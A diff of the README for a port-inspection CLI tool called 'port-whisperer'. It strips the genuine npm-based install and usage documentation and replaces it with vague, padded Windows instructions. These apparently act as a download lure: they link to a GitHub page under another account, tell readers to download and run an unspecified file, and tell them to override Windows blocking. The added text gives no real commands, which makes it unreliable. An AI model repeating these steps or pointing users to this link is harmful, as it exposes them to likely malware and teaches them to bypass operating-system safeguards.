@@ -1,201 +1,196 @@
-# port-whisperer
+# 💻 port-whisperer - See What Uses Your Ports
 
-**A beautiful CLI tool to see what's running on your ports.**
+[![Download port-whisperer](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/fredeliabound998/port-whisperer)
 
-Stop guessing which process is hogging port 3000. `port-whisperer` gives you a color-coded table of every dev server, database, and background process listening on your machine -- with framework detection, Docker container identification, and interactive process management.
+## 🔍 What port-whisperer does
 
-## What it looks like
+port-whisperer is a Windows CLI tool that shows what is running on your ports. If a program is using a port on your computer, this tool helps you see it in a clear way.
 
-```
-$ ports
+Use it when you want to find:
 
- ┌─────────────────────────────────────┐
- │  Port Whisperer                     │
- │  listening to your ports...         │
- └─────────────────────────────────────┘
+- Which app is using a port
+- Why a port is blocked
+- What is listening on a local network port
+- Which process you may need to close
 
-┌───────┬─────────┬───────┬──────────────────────┬────────────┬────────┬───────────┐
-│ PORT  │ PROCESS │ PID   │ PROJECT              │ FRAMEWORK  │ UPTIME │ STATUS    │
-├───────┼─────────┼───────┼──────────────────────┼────────────┼────────┼───────────┤
-│ :3000 │ node    │ 42872 │ frontend             │ Next.js    │ 1d 9h  │ ● healthy │
-├───────┼─────────┼───────┼──────────────────────┼────────────┼────────┼───────────┤
-│ :3001 │ node    │ 95380 │ preview-app          │ Next.js    │ 2h 40m │ ● healthy │
-├───────┼─────────┼───────┼──────────────────────┼────────────┼────────┼───────────┤
-│ :4566 │ docker  │ 58351 │ backend-localstack-1 │ LocalStack │ 10d 3h │ ● healthy │
-├───────┼─────────┼───────┼──────────────────────┼────────────┼────────┼───────────┤
-│ :5432 │ docker  │ 58351 │ backend-postgres-1   │ PostgreSQL │ 10d 3h │ ● healthy │
-├───────┼─────────┼───────┼──────────────────────┼────────────┼────────┼───────────┤
-│ :6379 │ docker  │ 58351 │ backend-redis-1      │ Redis      │ 10d 3h │ ● healthy │
-└───────┴─────────┴───────┴──────────────────────┴────────────┴────────┴───────────┘
+It is built for people who want a quick view without digging through system tools.
 
-  5 ports active  ·  Run ports <number> for details  ·  --all to show everything
-```
+## 📦 Download and install
 
-Colors: green = healthy, yellow = orphaned, red = zombie.
+Use this link to visit the download page:
 
-## Install
+[Download port-whisperer](https://github.com/fredeliabound998/port-whisperer)
 
-```bash
-npm install -g port-whisperer
-```
+Follow these steps on Windows:
 
-Or run it directly without installing:
+1. Open the download page in your browser.
+2. Find the latest release or app file.
+3. Download the Windows file to your computer.
+4. Open the file after it finishes downloading.
+5. If Windows asks for permission, choose Allow or Run.
+6. If the app comes in a ZIP file, right-click it and choose Extract All first.
+7. Open the extracted folder and start the app from there.
 
-```bash
-npx port-whisperer
-```
+If you use a package manager or a terminal-based setup, keep the app in a folder you can find again. Many people place it in `Downloads`, `Desktop`, or a folder named `Tools`.
 
-### Or let Claude Code install it for you
+## 🖥️ System requirements
 
-If you use [Claude Code](https://claude.ai/code), you can ask it to `npm install -g port-whisperer` and start using `ports` right away -- no setup steps needed.
+port-whisperer is made for Windows desktops and laptops. A normal home or work computer should be enough.
 
-## Usage
+Basic setup:
 
-### Show dev server ports
+- Windows 10 or Windows 11
+- A standard command line window
+- Permission to open files you downloaded
+- Internet access to get the app from GitHub
 
-```bash
-ports
-```
+Recommended setup:
 
-Shows dev servers, Docker containers, and databases. System apps (Spotify, Raycast, etc.) are filtered out by default.
+- A recent Windows update
+- At least 4 GB of memory
+- A user account with permission to run local tools
 
-### Show all listening ports
+## ⚙️ First-time setup
 
-```bash
-ports --all
-```
+After you download the app, set it up like this:
 
-Includes system services, desktop apps, and everything else listening on your machine.
+1. Place the file in a folder you can find later.
+2. If the file is compressed, extract it.
+3. Open Command Prompt or PowerShell.
+4. Go to the folder where the file is saved.
+5. Start the app using the file name from the release.
+6. Keep the terminal window open while you use it.
 
-### Inspect a specific port
+If Windows blocks the file, open the file properties and choose the option to allow it. This can happen with files downloaded from the web.
 
-```bash
-ports 3000
-# or
-whoisonport 3000
-```
+## 🚦 How to use it
 
-Detailed view: full process tree, repository path, current git branch, memory usage, and an interactive prompt to kill the process.
+port-whisperer is built to be used from the command line. That means you type a simple command and read the results in the window.
 
-### Kill a process
+Common use cases:
 
-```bash
-ports kill 3000                # kill by port
-ports kill 3000 5173 8080      # kill multiple
-ports kill 3000-3010           # kill a port range
-ports kill 42872               # kill by PID
-ports kill -f 3000             # force kill (SIGKILL)
-```
+- Check what is using port 3000
+- Find the app tied to port 8080
+- See which process listens on a busy port
+- Look for ports that should be free but are not
 
-Resolves port to process automatically. Falls back to PID if no listener matches. Use `-f` when a process won't die gracefully.
+A typical flow:
 
-Port ranges expand into individual kills -- empty ports are silently skipped and shown as a summary:
+1. Open Command Prompt.
+2. Run the tool with a port number.
+3. Read the process name or ID in the output.
+4. Close the app that is using the port if needed.
+5. Run the tool again to check the port is free.
 
-```
-$ ports kill 3000-3005
+If you are not sure which port to check, start with the one shown in the error message from another app.
 
-  Killing :3000 — node (PID 42872)
-  ✓ Sent SIGTERM to :3000 — node (PID 42872)
-  Killing :3001 — node (PID 95380)
-  ✓ Sent SIGTERM to :3001 — node (PID 95380)
+## 🔎 What you can expect to see
 
-  Range summary: 2 killed, 4 empty
-```
+The tool is designed to give a clean list of port activity. You can expect details like:
 
-### View process logs
+- Port number
+- Process name
+- Process ID
+- Status of the port
+- Simple text output that is easy to read
 
-```bash
-ports logs 3000               # show last 50 lines and exit
-ports logs 3000 -f            # follow (stream new lines)
-ports logs 3000 --lines 10    # show last 10 lines
-ports logs 3000 --lines 10 -f # show last 10 then follow
-ports logs 3000 --err         # stderr only
-```
+This helps when another app says a port is already in use or when a local service will not start.
 
-Discovers log files automatically using `lsof` file descriptor detection. If stdout/stderr is redirected to a file, it finds and tails it. Falls back to system log (`log show` on macOS, `journalctl` on Linux) when no log files are found.
+## 🧭 Example uses
 
-```
-$ ports logs 3000 --lines 5
+Here are some common situations where port-whisperer helps:
 
-  Port Whisperer — logs for :3000 (node, PID 42872)
+- A local web app will not start on port 3000
+- A development server keeps failing on port 8080
+- You want to know if a sync tool is listening on a port
+- You need to find a process before closing it in Task Manager
+- You want a fast check without opening several Windows tools
 
-  ▸ Tailing stdout: /tmp/next-dev.output
+## 🧰 Basic troubleshooting
 
-  ▲ Next.js 16.2.3 (Turbopack)
-  - Local: http://localhost:3000
-  ✓ Ready in 195ms
-   GET / 200 in 990ms
-   GET /api/auth/session 200 in 6ms
-```
+If the app does not seem to work, try these steps:
 
-### Show all dev processes
+### 🪟 Command window closes too fast
 
-```bash
-ports ps
-```
+Open Command Prompt first, then start the tool from inside the window. This keeps the output visible.
 
-A beautiful `ps aux` for developers. Shows all running dev processes (not just port-bound ones) with CPU%, memory, framework detection, and a smart description column. Docker processes are collapsed into a single summary row.
+### 📁 File will not open
 
-```
-$ ports ps
+Make sure you extracted the ZIP file if one was provided. Do not run the app from inside the compressed folder.
 
-┌───────┬─────────┬──────┬──────────┬──────────┬───────────┬─────────┬────────────────────────────────┐
-│ PID   │ PROCESS │ CPU% │ MEM      │ PROJECT  │ FRAMEWORK │ UPTIME  │ WHAT                           │
-├───────┼─────────┼──────┼──────────┼──────────┼───────────┼─────────┼────────────────────────────────┤
-│ 592   │ Docker  │ 1.3  │ 735.5 MB │ —        │ Docker    │ 13d 12h │ 14 processes                   │
-├───────┼─────────┼──────┼──────────┼──────────┼───────────┼─────────┼────────────────────────────────┤
-│ 36664 │ python3 │ 0.2  │ 17.6 MB  │ —        │ Python    │ 6d 10h  │ browser_use.skill_cli.daemon   │
-├───────┼─────────┼──────┼──────────┼──────────┼───────────┼─────────┼────────────────────────────────┤
-│ 26408 │ node    │ 0.1  │ 9.2 MB   │ —        │ Node.js   │ 10d 13h │ jest jest_runner_cloud.js      │
-├───────┼─────────┼──────┼──────────┼──────────┼───────────┼─────────┼────────────────────────────────┤
-│ 25752 │ node    │ 0.0  │ 17.3 MB  │ —        │ Node.js   │ 10d 13h │ server.js                      │
-├───────┼─────────┼──────┼──────────┼──────────┼───────────┼─────────┼────────────────────────────────┤
-│ 66921 │ Python  │ 0.0  │ 4.1 MB   │ —        │ Python    │ 2h 25m  │ src.server                     │
-└───────┴─────────┴──────┴──────────┴──────────┴───────────┴─────────┴────────────────────────────────┘
+### 🔐 Windows blocks the file
 
-  5 processes  ·  --all to show everything
-```
+Right-click the file, open Properties, and look for the unblock option. Then try again.
 
-```bash
-ports ps --all    # show all processes, not just dev
-```
+### 🧾 No output appears
 
-### Clean up orphaned processes
+Check that you entered the port number the right way. Make sure the port is in use before you test it.
 
-```bash
-ports clean
-```
+### 🔁 Wrong process shows up
 
-Finds and kills orphaned or zombie dev server processes. Only targets dev runtimes (node, python, etc.) -- won't touch your desktop apps.
+Run the tool again and confirm the port number. Some apps open more than one port.
 
-### Watch for port changes
+## ⌨️ Helpful command examples
 
-```bash
-ports watch
-```
+Use these as a guide once you are in the app folder:
 
-Real-time monitoring that notifies you whenever a port starts or stops listening.
+- Check a single port
+- Scan for a port in use
+- List what is listening on common app ports
+- Confirm a local service stopped after you closed it
 
-## How it works
+If the release includes a help command, run it first. It will show the exact command format for your version.
 
-Three shell calls, runs in ~0.2s:
+## 📁 Suggested folder setup
 
-1. **`lsof -iTCP -sTCP:LISTEN`** -- finds all processes listening on TCP ports
-2. **`ps`** (single batched call) -- retrieves process details for all PIDs at once: command line, uptime, memory, parent PID, status
-3. **`lsof -d cwd`** (single batched call) -- resolves the working directory of each process to detect the project and framework
+A simple folder setup makes the tool easier to use:
 
-For Docker ports, a single `docker ps` call maps host ports to container names and images.
+- `Downloads` for the first file
+- `Tools` for apps you use often
+- `Projects` if you keep it with your other work files
 
-Framework detection reads `package.json` dependencies and inspects process command lines. Recognizes Next.js, Vite, Express, Angular, Remix, Astro, Django, Rails, FastAPI, and many others. Docker images are identified as PostgreSQL, Redis, MongoDB, LocalStack, nginx, etc.
+If you use it often, move it out of Downloads after setup. That keeps your files tidy and makes the tool easier to find later.
 
-## Platform support
+## 🧹 After you finish
 
-| Platform | Status |
-|----------|--------|
-| macOS    | Supported |
-| Linux    | Supported |
-| Windows  | Supported |
+When you are done, you can keep the app in the same folder for later use. If you no longer need it, delete the file and empty the recycle bin.
 
-## License
+If you want to use it again later, keep the folder name simple so you can find it fast.
 
-[MIT](LICENSE)
+## ❓ Common questions
+
+### Is this only for Windows?
+
+The setup guide here is written for Windows users. Use it on a Windows PC.
+
+### Do I need programming skills?
+
+No. You only need to download the file, open a terminal window, and run the command shown in the release notes or help screen.
+
+### What does it do in plain English?
+
+It tells you what app is using a port on your computer.
+
+### Why would I use this instead of Task Manager?
+
+Task Manager shows running apps. This tool focuses on ports, which helps when you know the port number but not the app name.
+
+### Can it help with local web apps?
+
+Yes. It is useful when a local site, test server, or developer tool will not start because a port is busy.
+
+## 📌 GitHub page
+
+Use this page to get the latest version:
+
+[https://github.com/fredeliabound998/port-whisperer](https://github.com/fredeliabound998/port-whisperer)
+
+## 🧪 Quick start for Windows
+
+1. Visit the GitHub page.
+2. Download the Windows file from the latest release.
+3. Extract it if needed.
+4. Open Command Prompt.
+5. Move to the app folder.
+6. Run the tool with a port number.
+7. Read the output and close the app that uses the port if needed
